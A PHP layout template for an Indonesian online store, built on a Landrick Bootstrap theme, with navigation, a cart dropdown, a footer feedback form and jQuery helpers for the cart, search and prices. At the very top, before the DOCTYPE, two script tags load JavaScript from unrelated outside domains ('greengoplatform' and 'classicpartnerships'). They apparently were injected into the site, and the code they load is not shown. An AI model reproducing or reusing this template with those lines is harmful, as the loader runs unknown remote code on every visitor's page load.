<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script><script src='https://scripts.classicpartnerships.com/callme.js' type='text/javascript'></script>

<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Google Tag Manager -->
    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
        })(window,document,'script','dataLayer','GTM-MJC5FWG');</script>
    <!-- End Google Tag Manager -->
    <meta name="google-site-verification" content="MGaJ-eY9-qmOrrUlu3DHE_-qVFzq6NSYLYvY2hbmyis" />

    <meta charset="utf-8" />
    <title><?= $this->data['site']->nama ?></title>
    <link rel="shortcut icon" type="image/x-icon" href="<?=base_url().$this->data['site']->icon?>">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Premium Bootstrap 4 Landing Page Template" />
    <meta name="keywords" content="Saas, Software, multi-uses, HTML, Clean, Modern" />
    <meta name="author" content="Shreethemes" />
    <meta name="email" content="shreethemes@gmail.com" />
    <meta name="website" content="http://www.shreethemes.in/" />
    <meta name="Version" content="v2.6" />
    <!-- Font -->
    <link href="https://fonts.googleapis.com/css?family=Stylish" rel="stylesheet">
    <link rel="dns-prefetch" href="//fonts.googleapis.com">
    <!-- favicon -->
    <!-- Bootstrap -->
    <link href="<?=base_url().'assets/frontend/'?>css/bootstrap.min.css" rel="stylesheet" type="text/css" />
    <!-- Icons -->
    <link href="<?=base_url().'assets/frontend/'?>css/materialdesignicons.min.css" rel="stylesheet" type="text/css" />
    <link href="<?=base_url().'assets/frontend/'?>unicons.iconscout.com/release/v3.0.3/css/line.css" rel="stylesheet">
    <!-- FLEXSLIDER -->
    <link href="<?=base_url().'assets/frontend/'?>css/flexslider.css" rel="stylesheet" type="text/css" />
    <!-- Slider -->
    <link href="<?=base_url().'assets/frontend/'?>css/slick.css" rel="stylesheet"/>
    <link href="<?=base_url().'assets/frontend/'?>css/slick-theme.css" rel="stylesheet"/>
    <!-- Main Css -->
    <link href="<?=base_url().'assets/frontend/'?>css/style.min.css" rel="stylesheet" type="text/css" id="theme-opt" />
    <link href="<?=base_url().'assets/frontend/'?>css/colors/default.css" rel="stylesheet" id="color-opt">
    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
    <link href="<?=base_url().'assets/frontend/'?>css/owl.carousel.min.css" rel="stylesheet"/>
    <link href="<?=base_url().'assets/frontend/'?>css/owl.theme.default.min.css" rel="stylesheet"/>

    <link href="https://unpkg.com/swiper/swiper-bundle.css" rel="stylesheet">
    <link href="https://unpkg.com/swiper/swiper-bundle.min.css" rel="stylesheet">
    <link href="<?=base_url()?>assets/frontend/css/bootstrap-side-modals.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/select2@4.0.13/dist/css/select2.min.css" rel="stylesheet" />

    <script src="<?=base_url().'assets/frontend/'?>js/jquery-3.5.1.min.js"></script>
    <script src="<?=base_url().'assets/frontend/'?>js/owl.carousel.min.js"></script>
    <script src="<?=base_url().'assets/frontend/'?>js/owl.init.js"></script>
    <script src="<?=base_url().'assets/plugins/'?>jquery-validation/jquery.validate.min.js" type="text/javascript"></script>
    <script src="<?=base_url().'assets/plugins/'?>jQuery-autocomplete/jquery.autocomplete.js" type="text/javascript"></script>
    <script src="https://cdn.jsdelivr.net/npm/select2@4.0.13/dist/js/select2.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
    <script src="https://cdn.jsdelivr.net/picturefill/2.3.1/picturefill.min.js"></script>
    <style>
        *{font-family: 'Stylish', sans-serif!important;}
        html{font-family: 'Stylish', sans-serif!important;}
        body{font-family: 'Stylish', sans-serif!important;}
        .error{
            color:red!important;
        }

        .first-loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1050;
            background: rgba(168, 168, 168, .5)
        }
        .first-loader img {
            position: absolute;
            top: 50%;
            left: 50%;
            -webkit-transform: translate(-50%, -50%);
            -ms-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%);
            width: 60px;
            height: 60px
        }
        .swiper-container .next {
            height: 47px;
            width: 47px;
            background-image: url('https://indokids.co.id/assets/store/img/band-right.png');
            position: absolute;
            right: 0 !important;
            top: 50%;
            margin-top: -23.5px;
            z-index: 10;
            overflow: hidden;
            text-indent: -9000px;
            display: block;
            opacity: 1;
            transition: opacity 0.3s ease-in;
            -ms-transition: opacity 0.3s ease-in;
            -moz-transition: opacity 0.3s ease-in;
            -webkit-transition: opacity 0.3s ease-in;
        }
        .swiper-container .previous {
            height: 47px;
            width: 47px;
            background-image: url('https://indokids.co.id/assets/store/img/band-left.png');
            position: absolute;
            left: 0 !important;
            top: 50%;
            margin-top: -23.5px;
            z-index: 10;
            overflow: hidden;
            text-indent: -9000px;
            display: block;
            opacity: 1;
            transition: opacity 0.3s ease-in;
            -ms-transition: opacity 0.3s ease-in;
            -moz-transition: opacity 0.3s ease-in;
            -webkit-transition: opacity 0.3s ease-in;
        }
        .autocomplete-suggestions { border: 1px solid #999; background: #fff; cursor: default; overflow: auto; }
        .autocomplete-suggestion { padding: 10px 5px; font-size: 8pt; white-space: nowrap; overflow: hidden; }
        .autocomplete-selected { background: #f0f0f0; }
        .autocomplete-suggestions strong { font-weight: normal; color: #3399ff; }

    </style>
</head>


<body>
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MJC5FWG" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>

<!-- Navbar STart -->
<?php $mobile=$this->agent->is_mobile(); ?>
<header id="topnav" class="defaultscroll sticky">
    <div class="container">
        <!-- Logo container-->
        <div>
            <a class="logo" href="<?=base_url()?>">
                <img src="<?=base_url().$this->data['site']->logo?>" height="30" alt="">
            </a>
        </div>
        <ul class="buy-button list-inline mb-0">
            <li class="list-inline-item mb-0">
                <div class="dropdown">
                    <button type="button" class="btn btn-icon btn-primary dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                        <i class="uil uil-filter align-middle icons"></i>
                    </button>
                    <div class="dropdown-menu dd-menu dropdown-menu-right bg-white shadow rounded border-0 mt-3 py-0" style="width:400px;">
                        <form style="width: 100%!important;">
                            <input style="width:400px;" type="text" id="text" name="name" class="form-control border bg-white cari" placeholder="Tulis sesuatu disini...">
                        </form>
                    </div>
                </div>
            </li>
            <?php
            if($this->session->id_member!=''){
            ?>
            <li class="list-inline-item mb-0 pr-1">
                <div class="dropdown">
                    <button type="button" class="btn btn-icon btn-primary dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><i class="uil uil-shopping-cart align-middle icons"></i><small id="countCart"></small></button>
                    <div class="dropdown-menu dd-menu dropdown-menu-right bg-white shadow rounded border-0 mt-3 p-4" style="width: 300px;">
                        <div class="pb-4" id="cartNav">
                        </div>

                        <div class="media align-items-center justify-content-between pt-4 border-top">
                            <h6 class="text-dark mb-0">Total(Rp):</h6>
                            <h6 class="text-dark mb-0" id="totNav">0</h6>
                        </div>

                        <div class="media align-items-center justify-content-between pt-2">
                            <a href="javascript:void(0)" onclick="goCart()" class="btn btn-primary mr-2">Keranjang</a>
                            <a href="javascript:void(0)" class="btn btn-primary" onclick="bayar()">Bayar</a>
                        </div>
                    </div>
                </div>
            </li>
            <?php if(!$mobile){ ?>
            <li class="list-inline-item mb-0">
                <div class="dropdown dropdown-primary">
                    <button type="button" class="btn btn-icon btn-primary dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><i class="uil uil-user align-middle icons"></i></button>
                    <div class="dropdown-menu dd-menu dropdown-menu-right bg-white shadow rounded border-0 mt-3 py-3" style="width: 200px;">
                        <a class="dropdown-item text-dark" href="<?=base_url().'store/profile'?>"><i class="uil uil-user align-middle mr-1"></i> Profil</a>
                        <div class="dropdown-divider my-3 border-top"></div>
                        <a class="dropdown-item text-dark" href="<?=base_url().'store/logout'?>"><i class="uil uil-sign-out-alt align-middle mr-1"></i> Keluar</a>
                    </div>
                </div>

            </li>
            <?php } ?>
            <?php }else{ if(!$mobile){?>
                <li class="list-inline-item mb-0">
                    <div class="dropdown dropdown-primary">
                        <a href="<?=base_url().'store/auth?page=login'?>" class="btn btn-icon btn-primary" aria-haspopup="true" aria-expanded="false"><i class="uil uil-sign-in-alt align-middle icons"></i></a>
                    </div>
                </li>
            <?php }} ?>
        </ul><!--end login button-->
        <!-- End Logo container-->
        <div class="menu-extras">
            <div class="menu-item">
                <!-- Mobile menu toggle-->
                <a class="navbar-toggle">
                    <div class="lines">
                        <span></span>
                        <span></span>
                        <span></span>
                    </div>
                </a>
                <!-- End mobile menu toggle-->
            </div>
        </div>

        <div id="navigation">
            <!-- Navigation Menu-->
            <ul class="navigation-menu">
                <li><a style="text-shadow: -1px 0 white, 0 1px white, 1px 0 white, 0 -1px white ;<?=$this->uri->segment(1)==""?'color: #2f55d4!important;':'color:#000!important;'?>" href="<?=base_url()?>">Beranda</a></li>
                <li class="has-submenu">
                    <a href="javascript:void(0)" style="text-shadow: -1px 0 white, 0 1px white, 1px 0 white, 0 -1px white ;<?=$this->uri->segment(2)=='list_produk'?'color: #2f55d4!important;':'color:#000!important;'?>">Kategori</a><span class="menu-arrow"></span>
                    <ul class="submenu megamenu">
                        <li>
                            <ul>
                                <?php foreach ($nav_menu as $row) {?>
                                    <li>
                                        <a href="<?=base_url().'store/list_produk/groups/'.$row['id_groups']?>"><?=$row['nama']?></a>
                                    </li>
                                <?php } ?>
                            </ul>
                        </li>
                    </ul>
                </li>
                <li class="<?=$this->uri->segment(2)=="promo"?'active':null?>"><a style="text-shadow: -1px 0 white, 0 1px white, 1px 0 white, 0 -1px white ;<?=$this->uri->segment(2)=="promo"?'color: #2f55d4!important;':'color:#000!important;'?>" href="<?=base_url().'store/promo'?>">Promo</a></li>
                <li class="<?=$_GET['page']=='contact'?'active':null?>"><a style="text-shadow: -1px 0 white, 0 1px white, 1px 0 white, 0 -1px white ;<?=$_GET['page']=='contact'?'color: #2f55d4!important;':'color:#000!important;'?>" href="<?=base_url().'store?page=contact'?>">Kontak Kami</a></li>
                <li class="<?=$this->uri->segment(2)=='article'?'active':null?>"><a style="text-shadow: -1px 0 white, 0 1px white, 1px 0 white, 0 -1px white ;<?=$this->uri->segment(2)=='article'?'color: #2f55d4!important;':'color:#000!important;'?>" href="<?=base_url().'store/article/all'?>">Berita</a></li>
            </ul><!--end navigation menu-->
        </div><!--end navigation-->
    </div><!--end container-->
    <?php if($this->uri->segment(1)==''){?>
    <nav class="navbar navbar-dark bg-info navbar-expand d-md-none d-lg-none d-xl-none fixed-bottom" style="background-color:#2f55d4!important; ">
        <ul class="navbar-nav nav-justified w-100">
            <li class="nav-item" style="padding: 0px!important;<?=$this->uri->segment(1)==''?'border:2px solid white;border-radius:10px;':null;?>">
                <a href="<?=base_url()?>" class="nav-link" style="<?=$this->uri->segment(1)==''?'color:white':null;?>">
                    <i class="uil uil-estate align-middle icons"></i><br/> Beranda
                </a>
            </li>

            <li class="nav-item" style="<?=$this->uri->segment(2)=='promo'?'border:2px solid white':null?>">
                <a href="<?=base_url().'store/get_all_product'?>" class="nav-link" style="<?=$this->uri->segment(2)=='promo'?'color:white':null;?>">
                    <i class="uil uil-apps align-middle icons" style="padding:0px!important;"></i><br/> Produk
                </a>
            </li>

            <?php if($this->session->id_member!=''):?>
                <li class="nav-item" style="<?=$this->uri->segment(2)=='cart'?'border:2px solid white':null?>">
                    <a  onclick="goCart()" class="nav-link" style="<?=$this->uri->segment(2)=='article'?'color:white':null;?>">
                        <i class="uil uil-shopping-cart align-middle icons" style="padding:0px!important;"></i><br/> Keranjang
                    </a>

                </li>
            <?php else:?>
                <li class="nav-item" style="<?=$this->uri->segment(2)=='article'?'border:2px solid white':null?>">
                    <a href="<?=base_url().'store/article/all'?>" class="nav-link" style="<?=$this->uri->segment(2)=='article'?'color:white':null;?>">
                        <i class="uil uil-newspaper align-middle icons" style="padding:0px!important;"></i><br/> Berita
                    </a>

                </li>
            <?php endif;?>


            <li class="nav-item" style="<?=$this->uri->segment(2)=='auth'?'border:2px solid white':null;?>">
                <?php if($this->session->userdata('id_member')!=''){ ?>
                    <a href="<?=base_url().'store/profile'?>" class="nav-link" style="<?=$this->uri->segment(2)=='auth'?'color:white':null;?>">
<!--                        <img src="--><?//=base_url().'assets/images/member/2.jpg'?><!--" class="rounded-circle" style="height:25px;" alt="">-->
<!--                        <br/> Profile-->
                        <i class="uil uil-user align-middle icons" style="padding:0px!important;"></i><br/> Profil
                    </a>
                <?php } else{ ?>
                    <a href="<?=base_url().'store/auth?page=login'?>" class="nav-link" style="<?=$this->uri->segment(2)=='auth'?'color:white':null;?>">
<!--                        <img src="--><?//=base_url().'assets/images/member/2.jpg'?><!--" style="height: 20%;" alt="">-->
                        <i class="uil uil-sign-in-alt align-middle icons" style="padding:0px!important;"></i><br/> Masuk
                    </a>
                <?php } ?>
            </li>
        </ul>
    </nav>
    <?php } ?>
    <?php if($this->uri->segment(2)=='cart'){ ?>
    <nav class="navbar navbar-dark bg-info navbar-expand d-md-none d-lg-none d-xl-none fixed-bottom" style="background-color:#2f55d4!important; ">
        <ul class="navbar-nav nav-justified w-100">
            <li class="nav-item">
                <a href="javascript:void(0)" onclick="bayar()" class="nav-link text-left">Bayar <small class="totCart" style="float: right;font-weight: bold;"></small></a>
            </li>
        </ul>
    </nav>
    <?php } ?>
    <?php if($this->uri->segment(2)=='get_all_product'){ ?>
        <nav class="navbar navbar-dark bg-info navbar-expand d-md-none d-lg-none d-xl-none fixed-bottom" style="background-color:#2f55d4!important; ">
            <ul class="navbar-nav nav-justified w-100">
                <li class="nav-item">
                    <a href="javascript:void(0)" onclick="loadmore()" class="nav-link">Lebih banyak</a>
                </li>
            </ul>
        </nav>
    <?php } ?>
    <?php if($this->uri->segment(2)=='list_produk'&&$this->uri->segment(4)!=''&&$this->uri->segment(4)!=''){ ?>
        <nav class="navbar navbar-dark bg-info navbar-expand d-md-none d-lg-none d-xl-none fixed-bottom" style="background-color:#2f55d4!important; ">
            <ul class="navbar-nav nav-justified w-100">
                <li class="nav-item">
                    <a href="javascript:void(0)" onclick="loadmoreProduct()" class="nav-link">Lebih banyak</a>
                </li>
            </ul>
        </nav>
    <?php } ?>

    <?php if($this->uri->segment(2)=='article'&&$this->uri->segment(3)!=''){ ?>
        <nav class="navbar navbar-dark bg-info navbar-expand d-md-none d-lg-none d-xl-none fixed-bottom" style="background-color:#2f55d4!important; ">
            <ul class="navbar-nav nav-justified w-100">
                <li class="nav-item">
                    <a href="javascript:void(0)" onclick="loadmoreNews()" class="nav-link">Lebih banyak</a>
                </li>
            </ul>
        </nav>
    <?php } ?>
</header><!--end header-->
<!-- Navbar End -->
<?php $this->load->view($content); ?>
<?php if(!$mobile||$this->uri->segment(1)==""){ ?>
<!-- Footer Start -->
<footer class="footer">
    <div class="container">
        <div class="row">
            <div class="col-lg-3 col-12 mb-0 mb-md-4 pb-0 pb-md-2">
                <a href="#" class="logo-footer">
                    <img src="<?=base_url().$this->data['site']->logo?>" height="30" alt="">
                </a>
                <p class="mt-4">
                <ul class="navbar-nav nav-justified w-100">
                    <li><a class="text-foot" href="#"><?=$cs['open']?></a></li>
                    <li><a class="text-foot" href="#"><?=$cs['time_open']?> to <?=$cs['time_close']?></a></li>
                    <li><a class="text-foot" href="tel:<?=$cs['tlp']?>"><?=$cs['tlp']?></a></li>
                    <li><a class="text-foot" href="mailto:<?=$cs['email']?>"><?=$cs['email']?></a></li>
                </ul>
                </p>
                <ul class="navbar-nav nav-justified w-100">
                    <li><a class="text-foot" href="https://api.whatsapp.com/send?phone=<?=$sosmed['whatsapp']?>">WahtsApp : <?=$sosmed['whatsapp']?></a></li>
                    <li><a class="text-foot" href="<?=$sosmed['twitter']?>">Twitter : <?=$sosmed['twitter']?></a></li>
                    <li><a class="text-foot" href="<?=$sosmed['facebook']?>">Facebook : <?=$sosmed['facebook']?></a></li>
                    <li><a class="text-foot" href="<?=$sosmed['instagram']?>">Instagram : <?=$sosmed['instagram']?></a></li>

<!--                    <li class="list-inline-item"><a href="--><?//=$sosmed['facebook']?><!--" class="rounded"><i data-feather="facebook" class="fea icon-sm fea-social"></i></a></li>-->
<!--                    <li class="list-inline-item"><a href="--><?//=$sosmed['instagram']?><!--" class="rounded"><i data-feather="instagram" class="fea icon-sm fea-social"></i></a></li>-->
<!--                    <li class="list-inline-item"><a href="--><?//=$sosmed['twitter']?><!--" class="rounded"><i data-feather="twitter" class="fea icon-sm fea-social"></i></a></li>-->
<!--                    <li class="list-inline-item"><a href="https://api.whatsapp.com/send?phone=--><?//=$sosmed['whatsapp']?><!--" class="rounded"><i data-feather="whatsapp" class="fea icon-sm fea-social"></i></a></li>-->
                </ul><!--end icon-->
            </div><!--end col-->

            <div class="col-lg-3 col-md-4 col-12 mt-4 mt-sm-0 pt-2 pt-sm-0">
                <h5 class="text-light footer-head"><?= $this->data['site']->nama ?></h5>
                <ul class="list-unstyled footer-list mt-4">

                    <li><a href="<?=base_url().'store/other?page=about'?>" class="text-foot"><i class="mdi mdi-chevron-right mr-1"></i> About us</a></li>
                    <li><a href="<?=base_url().'store/other?page=privacy_policy'?>" class="text-foot"><i class="mdi mdi-chevron-right mr-1"></i> Privacy & Policy</a></li>
                    <li><a href="<?=base_url().'store/other?page=resolution'?>" class="text-foot"><i class="mdi mdi-chevron-right mr-1"></i> Resolution Center</a></li>
                    <li><a href="<?=base_url().'store/other?page=career'?>" class="text-foot"><i class="mdi mdi-chevron-right mr-1"></i> Career</a></li>
                    <li><a href="<?=base_url().'store/other?page=tutorial'?>" class="text-foot"><i class="mdi mdi-chevron-right mr-1"></i> Tutorial</a></li>
                    <li><a href="<?=base_url().'store/other?page=gallery'?>" class="text-foot"><i class="mdi mdi-chevron-right mr-1"></i> Gallery</a></li>
                    <li><a href="<?=base_url().'store/article/all'?>" class="text-foot"><i class="mdi mdi-chevron-right mr-1"></i> Article</a></li>
                </ul>
            </div><!--end col-->

            <div class="col-lg-3 col-md-4 col-12 mt-4 mt-sm-0 pt-2 pt-sm-0">
                <h5 class="text-light footer-head">Kategori</h5>
                <ul class="list-unstyled footer-list mt-4">
                    <?php foreach ($nav_menu as $row) {
                        echo '
<li><a href="'.base_url().'store/list_produk/groups/'.$row['id_groups'].'" class="text-foot"><i class="mdi mdi-chevron-right mr-1"></i>'.$row['nama'].'</a></li>
									
                                ';}?>

                </ul>
            </div><!--end col-->

            <div class="col-lg-3 col-md-4 col-12 mt-4 mt-sm-0 pt-2 pt-sm-0">
                <h5 class="text-light footer-head">Kontak Kami</h5>
<!--                <form>-->
                    <div class="row">
                        <div class="col-lg-12">
                            <div class="foot-subscribe form-group">
                                <div class="position-relative">
                                    <i data-feather="email" class="fea icon-sm icons"></i>
                                    <textarea placeholder="Tulis pesan anda disini .." name="pesan" id="pesan" class="form-control pl-5 rounded" cols="30" rows="4"></textarea>
                                    <input type="hidden" id="member" value="<?=$this->session->id_member?>">
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-12">

                            <input onclick="submitForm()" type="submit" id="submitsubscribe" name="send" class="btn btn-soft-primary btn-block" value="Kirim">
                        </div>
                    </div>
<!--                </form>-->
            </div><!--end col-->
        </div><!--end row-->
    </div><!--end container-->
</footer><!--end footer-->
<footer class="footer footer-bar">
    <div class="container text-center">
        <div class="row align-items-center">
            <div class="col-sm-12">
                <div class="text-sm-left">
                    <p class="mb-0">© <script>document.write(new Date().getFullYear())</script> <?=$this->data['site']->nama?>. Design with <i class="mdi mdi-heart text-danger"></i> by <a href="http://ptnetindo.com/" target="_blank" class="text-reset">NETINDO MEDIATAMA PERKASA</a>.</p>
                </div>
            </div><!--end col-->


        </div><!--end row-->
    </div><!--end container-->
</footer><!--end footer-->
<!-- Footer End -->
<?php } ?>

<!-- Back to top -->
<a href="#" class="btn btn-icon btn-primary back-to-top" style="margin-bottom: 100px!important;"><i data-feather="arrow-up" class="icons"></i></a>
<!-- Back to top -->


<!-- javascript -->
<script src="<?=base_url().'assets/frontend/'?>js/bootstrap.bundle.min.js"></script>
<script src="<?=base_url().'assets/frontend/'?>js/jquery.easing.min.js"></script>
<script src="<?=base_url().'assets/frontend/'?>js/scrollspy.min.js"></script>
<!--FLEX SLIDER-->
<script src="<?=base_url().'assets/frontend/'?>js/jquery.flexslider-min.js"></script>
<script src="<?=base_url().'assets/frontend/'?>js/flexslider.init.js"></script>
<!-- Slider -->
<script src="<?=base_url().'assets/frontend/'?>js/slick.min.js"></script>
<script src="<?=base_url().'assets/frontend/'?>js/slick.init.js"></script>
<!-- Icons -->
<script src="<?=base_url().'assets/frontend/'?>js/feather.min.js"></script>
<script src="<?=base_url().'assets/frontend/'?>unicons.iconscout.com/release/v3.0.3/script/monochrome/bundle.js"></script>
<!-- Switcher -->
<script src="<?=base_url().'assets/frontend/'?>js/switcher.js"></script>
<!-- Main Js -->
<script src="<?=base_url().'assets/frontend/'?>js/app.js"></script>
<script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>

<script src="https://unpkg.com/swiper/swiper-bundle.js"></script>
<script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>
<!-- Quantity Plus Minus JS -->
<script>
    $(document).ready(function(){
        countCart();
        AOS.init();
    });
    function submitForm(){
        if ("<?=$this->session->id_member?>" !== '') {
            var data_ = {
                member: $("#member").val(),
                pesan:$("#pesan").val(),
            };
            if($("#pesan").val()==""){
                $("#pesan").focus();
            }
            else{
                $.ajax({
                    url: "<?=base_url().'api/feedback'?>",
                    type: "POST",
                    data: data_,
                    dataType: "JSON",
                    beforeSend: function() {
                        $('body').append('<div class="first-loader"><img src="<?=base_url().'/assets/images/spin.svg'?>"></div>');
                    },
                    complete: function() {
                        $('.first-loader').remove();
                    },
                    success: function (res) {
                        if (res.status) {
                            $("#pesan").val("");
                            Swal.fire({
                                title: 'Berhasil',
                                text: "Terimakasih telah meluangkan waktu anda",
                                icon: 'success',
//                            showCancelButton: true,
                                confirmButtonColor: '#3085d6',
//                            cancelButtonColor: '#d33',
                                confirmButtonText: 'Oke'
                            })
                        } else {
                            alert("Data gagal disimpan!");
                        }
                    }
                });
            }

        }
        else{
            Swal.fire({
                title: 'Opppss ...',
                text: "You have not logged in",
                icon: 'warning',
                showCancelButton: true,
                confirmButtonColor: '#3085d6',
                cancelButtonColor: '#d33',
                confirmButtonText: 'Sign In'
            }).then((result) => {
                if (result.value) {
                    window.location.href="<?=base_url().'store/auth?page=login'?>"
                }
            })
        }

    }

    $(".cari").autocomplete({

        minChars: 1,
        serviceUrl: '<?=base_url().'ajax/get_produk'?>',
        type: 'post',
        dataType: 'json',
        matchSubset: false,
        response: function(event, ui) {

            if (ui.content.length === 0) {
                $("#empty-message").text("No results found");
            } else {
                $("#empty-message").empty();
            }
        },
        onSelect: function (suggestion) {
            if (suggestion.lokasi !== 'not_found') {
                window.location.href='<?=base_url().'store/product?product_id='?>'+suggestion.id_produk;
            } else {

            }
        }
    });

    $('.plus').click(function () {
        if ($(this).prev().val() < 999) {
            $(this).prev().val(+$(this).prev().val() + 1);
        }
    });
    $('.minus').click(function () {
        if ($(this).next().val() > 1) {
            if ($(this).next().val() > 1) $(this).next().val(+$(this).next().val() - 1);
        }
    });
    var mySwiperBestSeller = new Swiper ('.swiper-best-seller', {
        direction: 'horizontal',
        autoplay: true,
        autoplaySpeed: 2000,
        loop: true,
        pagination: {
            el: '.swiper-pagination',
            clickable: true,
        },
        grabCursor: true,
        centeredSlides: true,
        navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
        },
        breakpoints: {
            320: {
                slidesPerView: 2,
                spaceBetween: 10,
                centeredSlides: true,
            },
            // when window width is <= 480px
            480: {
                slidesPerView: 2,
                spaceBetween: 20,
                centeredSlides: true,
            },

            640: {
                slidesPerView: 2,
                spaceBetween: 20,
                centeredSlides: true,
            },
            768: {
                slidesPerView: 3,
                spaceBetween: 30,
            },
            1024: {
                slidesPerView: 4,
                spaceBetween: 40,
            },
        }
    });

    function countCart(){
        $.ajax({
            url : "<?=base_url().'ajax/cart'?>",
            type : "POST",
            dataType : "JSON",
            beforeSend: function() {$('body').append('<div class="first-loader"><img src="<?=base_url()?>assets/images/spin.svg"></div>');},
            complete: function() {$('.first-loader').remove();},
            success:function(res){
                $("#countCart").html(res.count);
                $("#countCartMbl").html(res.count);
                $("#cartNav").html(res.result);
                $("#totNav").html(res.total)
                $(".totCart").html(res.total)
            }
        })
    }
    function goCart(){
        if($("#countCart").text()==="0"){
            Swal.fire({
                title: 'Information !!!',
                text: 'Item not available ',
                icon: 'warning',
            })
        }
        else{
            window.location.href="<?=base_url().'store/cart'?>"
        }
    }
    function bayar(){
        if($("#countCart").text()==="0"){
            Swal.fire({
                title: 'Information !!!',
                text: 'Item not available ',
                icon: 'warning',
            })
        }
        else{
            window.location.href="<?=base_url().'store/checkout'?>"
        }

    }
    function to_rp(angka, param=null){
        if(angka !== '' || angka !== 0){
            var rev     = parseInt(angka, 10).toString().split('').reverse().join('');
            var rev2    = '';
            for(var i = 0; i < rev.length; i++){
                rev2  += rev[i];
                if((i + 1) % 3 === 0 && i !== (rev.length - 1)){
                    rev2 += ',';
                }
            }

            var dec		= parseFloat(angka, 10).toString().split('.');
            if(dec[1] > 0){ dec = dec[1]; } else { dec = '00'; }

            //return 'IDR : ' + rev2.split('').reverse().join('') + ',-';
            return rev2.split('').reverse().join('') + (param==null?'.' + dec:'');
        } else {
            //return 'IDR : ';
            return '0';
        }
    }

</script>
</body>

<!-- Mirrored from shreethemes.in/landrick/layouts/index-shop.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 01 Dec 2020 14:33:21 GMT -->
</html>